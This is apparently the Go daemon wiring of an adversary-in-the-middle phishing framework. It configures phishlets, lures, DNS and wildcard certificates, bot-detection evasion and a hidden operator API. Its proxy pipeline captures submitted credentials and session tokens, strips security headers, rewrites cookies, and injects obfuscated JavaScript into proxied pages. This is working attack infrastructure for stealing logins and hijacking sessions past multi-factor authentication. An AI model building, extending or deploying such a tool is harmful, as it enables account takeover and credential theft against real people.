package daemon

import (
	"context"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/api"
	"github.com/travisbale/mirage/internal/botguard"
	"github.com/travisbale/mirage/internal/cert"
	"github.com/travisbale/mirage/internal/config"
	"github.com/travisbale/mirage/internal/dns"
	"github.com/travisbale/mirage/internal/events"
	"github.com/travisbale/mirage/internal/obfuscator"
	"github.com/travisbale/mirage/internal/phishlet"
	"github.com/travisbale/mirage/internal/proxy"
	"github.com/travisbale/mirage/internal/proxy/handlers/request"
	"github.com/travisbale/mirage/internal/proxy/handlers/response"
	"github.com/travisbale/mirage/internal/puppet"
	"github.com/travisbale/mirage/internal/store/sqlite"
)

type scriptObfuscator interface {
	Obfuscate(ctx context.Context, html []byte) ([]byte, error)
	Shutdown(ctx context.Context) error
}

// Daemon is the fully-wired daemon. One instance per process.
type Daemon struct {
	configPath string
	logger     *slog.Logger

	cfg *config.Config

	// Infrastructure.
	db                *sqlite.DB
	bus               *events.Bus
	dnsService        *aitm.DNSService
	watcher           *phishlet.Watcher
	phishletReloadSub <-chan aitm.Event
	certSource        aitm.CertSource

	// Proxy.
	proxy *proxy.AITMProxy

	// JS obfuscator — always non-nil after New (no-op when disabled).
	obfuscator scriptObfuscator

	// Puppet service — always non-nil after New (no-op when disabled).
	puppetSvc *aitm.PuppetService

	// Services needed by health check and reload.
	phishletSvc *aitm.PhishletService
	sessionSvc  *aitm.SessionService
}

// initializer carries transient build-time state
type initializer struct {
	*Daemon

	lureStore     *sqlite.Lures
	phishletStore *sqlite.Phishlets
	resolver      *aitm.PhishletResolver
	zones         map[string]aitm.ZoneConfig
	dnsProviders  map[string]aitm.DNSProvider
	botStore      *sqlite.Bots
	botGuardSvc   *aitm.BotGuardService
	sessionStore  *sqlite.Sessions
	lureSvc       *aitm.LureService
	blacklistSvc  *aitm.BlacklistService
	puppetSvc     *aitm.PuppetService
	spoofProxy    *proxy.SpoofProxy
	wsHub         *proxy.WSHub
}

// New constructs and fully wires a Daemon. Returns an error if any
// subsystem fails to initialise — no partial startup.
func New(configPath string, version string, logger *slog.Logger) (*Daemon, error) {
	cfg, err := loadConfig(configPath)
	if err != nil {
		return nil, err
	}

	ini := &initializer{
		Daemon: &Daemon{
			configPath: configPath,
			logger:     logger,
			cfg:        cfg,
			bus:        events.NewBus(events.DefaultBufferSize),
		},
	}

	if err := ini.initStore(); err != nil {
		return nil, err
	}
	if err := ini.initPhishlets(); err != nil {
		return nil, err
	}
	if err := ini.initDNS(); err != nil {
		return nil, err
	}
	if err := ini.initCerts(); err != nil {
		return nil, err
	}
	if err := ini.initServices(); err != nil {
		return nil, err
	}
	if err := ini.initProxy(version); err != nil {
		return nil, err
	}

	ini.initWatcher()

	activeCount := ini.countActive()
	logger.Info("miraged ready",
		"version", version,
		"domain", cfg.Domain,
		"https_port", cfg.HTTPSPort,
		"api_hostname", cfg.API.SecretHostname,
		"active_phishlets", activeCount,
	)

	return ini.Daemon, nil
}

func (ini *initializer) initStore() error {
	db, err := sqlite.Open(filepath.Join(ini.cfg.DataDir, "data.db"))
	if err != nil {
		return fmt.Errorf("opening database: %w", err)
	}
	ini.db = db

	return nil
}

func (ini *initializer) initPhishlets() error {
	ini.phishletStore = sqlite.NewPhishletStore(ini.db)
	ini.lureStore = sqlite.NewLureStore(ini.db)
	ini.resolver = aitm.NewPhishletResolver(ini.lureStore)

	ini.loadPhishlets(ini.cfg.PhishletsDir, ini.resolver)

	zones, err := ini.extractZones(ini.cfg.ExternalIPv4)
	if err != nil {
		return err
	}
	ini.zones = zones

	return nil
}

// extractZones reads enabled phishlet configs and builds the DNS zone map
// needed by DNSService. This is separate from LoadActiveFromDB so DNS can be
// initialised before PhishletService is fully wired.
func (ini *initializer) extractZones(externalIP string) (map[string]aitm.ZoneConfig, error) {
	phishlets, err := ini.phishletStore.ListPhishlets()
	if err != nil {
		return nil, fmt.Errorf("listing phishlets: %w", err)
	}
	zones := make(map[string]aitm.ZoneConfig)
	for _, phishlet := range phishlets {
		if phishlet.Enabled && phishlet.BaseDomain != "" && phishlet.DNSProvider != "" {
			zones[phishlet.BaseDomain] = aitm.ZoneConfig{
				Zone:         phishlet.BaseDomain,
				ProviderName: phishlet.DNSProvider,
				ExternalIP:   externalIP,
			}
		}
	}
	return zones, nil
}

func (ini *initializer) initDNS() error {
	providers, err := dns.BuildProviders(ini.cfg.DNSProviders, ini.cfg.ExternalIPv4, ini.cfg.DNSPort)
	if err != nil {
		return fmt.Errorf("initializing DNS providers: %w", err)
	}
	ini.dnsProviders = providers
	ini.dnsService = aitm.NewDNSService(providers, ini.zones, ini.bus)

	return nil
}

func (ini *initializer) initCerts() error {
	dataDir := ini.cfg.DataDir

	// Build per-zone provider map for wildcard DNS-01 ACME.
	zonedProviders := make(map[string]aitm.DNSProvider)
	for baseDomain, zone := range ini.zones {
		if p, ok := ini.dnsProviders[zone.ProviderName]; ok {
			zonedProviders[baseDomain] = p
		}
	}

	src, err := cert.NewSource(cert.SourceConfig{
		SelfSigned:       ini.cfg.SelfSigned,
		CADir:            filepath.Join(dataDir, "ca"),
		CertFileDir:      filepath.Join(dataDir, "certs"),
		ACMEEmail:        ini.cfg.ACME.Email,
		ACMEDirectoryURL: ini.cfg.ACME.DirectoryURL,
		ACMEStorageDir:   filepath.Join(dataDir, "acme"),
		Providers:        zonedProviders,
	}, ini.logger)
	if err != nil {
		return err
	}

	ini.certSource = src

	return nil
}

func (ini *initializer) initServices() error {
	ini.botStore = sqlite.NewBotStore(ini.db)
	ini.botGuardSvc = &aitm.BotGuardService{
		Scorer: &botguard.Scorer{
			Config: botguard.BotGuardConfig{
				Enabled:            true,
				TelemetryThreshold: 0.6,
			},
			Logger: ini.logger,
		},
		Store:          ini.botStore,
		SignatureStore: ini.botStore,
		Bus:            ini.bus,
	}
	if err := ini.botGuardSvc.LoadSignaturesFromDB(); err != nil {
		return fmt.Errorf("loading bot signatures: %w", err)
	}

	ini.sessionStore = sqlite.NewSessionStore(ini.db)
	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: ini.resolver}
	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
	ini.spoofProxy = proxy.NewSpoofProxy("")
	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)

	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.resolver)
	if err := phishletSvc.LoadActiveFromDB(); err != nil {
		return fmt.Errorf("loading active phishlets: %w", err)
	}
	ini.phishletSvc = phishletSvc

	if err := ini.resolver.LoadLuresFromDB(); err != nil {
		return fmt.Errorf("loading lures: %w", err)
	}

	ini.puppetSvc = ini.initPuppet()
	ini.puppetSvc.Start()
	ini.Daemon.puppetSvc = ini.puppetSvc

	return nil
}

func (ini *initializer) initPuppet() *aitm.PuppetService {
	cfg := ini.cfg.Puppet
	builder := &puppet.OverrideBuilder{}
	svcCfg := aitm.PuppetServiceConfig{
		CacheTTL:      cfg.CacheTTL,
		NavTimeout:    cfg.NavTimeout,
		MaxConcurrent: cfg.MaxInstances,
	}
	newNoOp := func() *aitm.PuppetService {
		return aitm.NewPuppetService(&puppet.NoOpCollector{}, builder, ini.bus, svcCfg, ini.logger)
	}

	if !cfg.Enabled {
		ini.logger.Debug("puppet service disabled")
		return newNoOp()
	}

	pool, err := puppet.NewPool(cfg, ini.logger)
	if err != nil {
		ini.logger.Warn("puppet pool unavailable, falling back to no-op", "error", err)
		return newNoOp()
	}

	collector := puppet.NewCollector(pool, cfg.NavTimeout, ini.logger)
	return aitm.NewPuppetService(collector, builder, ini.bus, svcCfg, ini.logger)
}

func (ini *initializer) initProxy(version string) error {
	apiHandler := &api.Router{
		Sessions:  ini.sessionSvc,
		Lures:     ini.lureSvc,
		Phishlets: ini.phishletSvc,
		Blacklist: ini.blacklistSvc,
		Botguard:  ini.botGuardSvc,
		Bus:       ini.bus,
		Domain:    ini.cfg.Domain,
		HTTPSPort: ini.cfg.HTTPSPort,
		Version:   version,
		Logger:    ini.logger,
	}

	ini.obfuscator = &obfuscator.NoOpObfuscator{}
	if ini.cfg.Obfuscator.Enabled {
		nodeObfuscator, err := obfuscator.NewNodeObfuscator(ini.cfg.Obfuscator, ini.logger)
		if err != nil {
			ini.logger.Warn("failed to start Node obfuscator sidecar, falling back to no-op", "error", err)
		} else {
			ini.obfuscator = nodeObfuscator
		}
	}

	pipeline := buildPipeline(pipelineDeps{
		botGuardSvc:      ini.botGuardSvc,
		blacklistSvc:     ini.blacklistSvc,
		sessionSvc:       ini.sessionSvc,
		phishletResolver: ini.resolver,
		phishletSvc:      ini.phishletSvc,
		spoofProxy:       ini.spoofProxy,
		apiHandler:       apiHandler,
		apiHostname:      ini.cfg.API.SecretHostname,
		obfuscator:       ini.obfuscator,
		puppetSvc:        ini.puppetSvc,
	}, ini.logger)

	aitmProxy := &proxy.AITMProxy{
		CertSource: ini.certSource,
		Pipeline:   pipeline,
		WSHub:      ini.wsHub,
		Spoof:      ini.spoofProxy,
		Logger:     ini.logger,
	}

	apiCACertPath := filepath.Join(ini.cfg.DataDir, "api-ca.crt")
	clientCA, err := loadOrGenerateCA(apiCACertPath, ini.logger)
	if err != nil {
		return err
	}
	if err := issueOperatorCert(clientCA, apiCACertPath, ini.logger); err != nil {
		return err
	}
	aitmProxy.SecretHostname = ini.cfg.API.SecretHostname
	aitmProxy.ClientCAs = clientCA.CertPool()
	ini.logger.Info("API enabled", "hostname", ini.cfg.API.SecretHostname, "ca_cert", apiCACertPath)

	ini.proxy = aitmProxy

	return nil
}

func (ini *initializer) initWatcher() {
	var err error
	ini.watcher, err = phishlet.NewWatcher(ini.cfg.PhishletsDir, ini.bus)
	if err != nil {
		ini.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
		return
	}
	ini.phishletReloadSub = aitm.SubscribeFunc(ini.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
		if p, ok := ev.Payload.(*aitm.Phishlet); ok {
			ini.resolver.Register(p)
		}
	})
	ini.watcher.Start()
}

func (ini *initializer) countActive() int {
	phishlets, err := ini.phishletSvc.List()
	if err != nil {
		return 0
	}
	n := 0
	for _, p := range phishlets {
		if p.Enabled {
			n++
		}
	}
	return n
}

// SetUpstreamTransport replaces the transport used to forward requests to the
// upstream origin. Intended for testing only — inject a transport that dials a
// local httptest.Server so tests don't need real DNS or internet access.
func (d *Daemon) SetUpstreamTransport(rt http.RoundTripper) {
	d.proxy.UpstreamTransport = rt
}

// ---- helpers ----------------------------------------------------------------

func (d *Daemon) loadPhishlets(dir string, resolver *aitm.PhishletResolver) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		d.logger.Warn("could not read phishlets directory", "dir", dir, "error", err)
		return
	}

	loader := &phishlet.Loader{}
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}

		name := strings.ToLower(entry.Name())
		if !strings.HasSuffix(name, ".yaml") && !strings.HasSuffix(name, ".yml") {
			continue
		}

		path := filepath.Join(dir, entry.Name())
		def, err := loader.Load(path)
		if err != nil {
			d.logger.Error("failed to load phishlet", "path", path, "error", err)
			continue
		}

		resolver.Register(def)
		d.logger.Info("loaded phishlet", "name", def.Name)
	}
}

func loadConfig(path string) (*config.Config, error) {
	cfg, err := config.Load(path)
	if err != nil {
		return nil, fmt.Errorf("loading config: %w", err)
	}

	if err := cfg.Validate(); err != nil {
		return nil, fmt.Errorf("invalid config: %w", err)
	}

	return cfg, nil
}

func issueOperatorCert(ca *api.CA, caCertPath string, logger *slog.Logger) error {
	dir := filepath.Dir(caCertPath)
	certPath := filepath.Join(dir, "operator.crt")
	keyPath := filepath.Join(dir, "operator.key")

	if _, err := os.Stat(certPath); err == nil {
		return nil
	}

	certPEM, keyPEM, err := ca.IssueClientCert("operator")
	if err != nil {
		return fmt.Errorf("issuing operator client cert: %w", err)
	}

	if err := os.WriteFile(certPath, certPEM, 0644); err != nil {
		return fmt.Errorf("writing operator cert: %w", err)
	}

	if err := os.WriteFile(keyPath, keyPEM, 0600); err != nil {
		return fmt.Errorf("writing operator key: %w", err)
	}

	logger.Info("issued operator client certificate", "cert", certPath, "key", keyPath)

	return nil
}

func loadOrGenerateCA(certPath string, logger *slog.Logger) (*api.CA, error) {
	if _, err := os.Stat(certPath); os.IsNotExist(err) {
		if err := os.MkdirAll(filepath.Dir(certPath), 0750); err != nil {
			return nil, fmt.Errorf("creating CA directory: %w", err)
		}

		ca, err := api.GenerateCA(certPath)
		if err != nil {
			return nil, fmt.Errorf("generating API CA: %w", err)
		}

		logger.Info("generated API client CA", "cert", certPath)

		return ca, nil
	}

	return api.Load(certPath)
}

// ---- pipeline ---------------------------------------------------------------

type pipelineDeps struct {
	botGuardSvc      *aitm.BotGuardService
	blacklistSvc     *aitm.BlacklistService
	sessionSvc       *aitm.SessionService
	phishletResolver *aitm.PhishletResolver
	phishletSvc      *aitm.PhishletService
	spoofProxy       *proxy.SpoofProxy
	apiHandler       *api.Router
	apiHostname      string
	obfuscator       scriptObfuscator
	puppetSvc        *aitm.PuppetService
}

func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
	return &proxy.Pipeline{
		RequestHandlers: []proxy.RequestHandler{
			&request.JA4Extractor{},
			&request.BotGuardCheck{
				Service: d.botGuardSvc,
				Spoof:   d.spoofProxy,
			},
			&request.IPExtractor{},
			&request.BlacklistChecker{
				Service: d.blacklistSvc,
				Spoof:   d.spoofProxy,
			},
			&request.APIRouter{
				SecretHostname: d.apiHostname,
				Handler:        d.apiHandler,
			},
			&request.PhishletRouter{
				Hostnames: d.phishletSvc,
				Resolver:  d.phishletResolver,
				Spoof:     d.spoofProxy,
			},
			&request.LureValidator{
				Spoof: d.spoofProxy,
			},
			&request.SessionResolver{
				Sessions: d.sessionSvc,
			},
			&request.PuppetOverrideResolver{
				Source: d.puppetSvc,
			},
			&request.TelemetryScoreCheck{
				Scorer:    d.botGuardSvc,
				Spoof:     d.spoofProxy,
				Threshold: 0.6,
			},
			&request.URLRewriter{},
			&request.CredentialExtractor{
				Capturer: d.sessionSvc,
				Logger:   logger,
			},
			&request.ForcePostInjector{},
		},
		ResponseHandlers: []proxy.ResponseHandler{
			&response.SecurityHeaderStripper{},
			&response.CookieRewriter{},
			&response.SubFilterApplier{},
			&response.TokenExtractor{
				Sessions:  d.sessionSvc,
				Whitelist: d.blacklistSvc,
				Logger:    logger,
			},
			&response.JSInjector{},
			&response.JSObfuscator{
				Obfuscator: d.obfuscator,
				Logger:     logger,
			},
		},
		Logger: logger,
	}
}
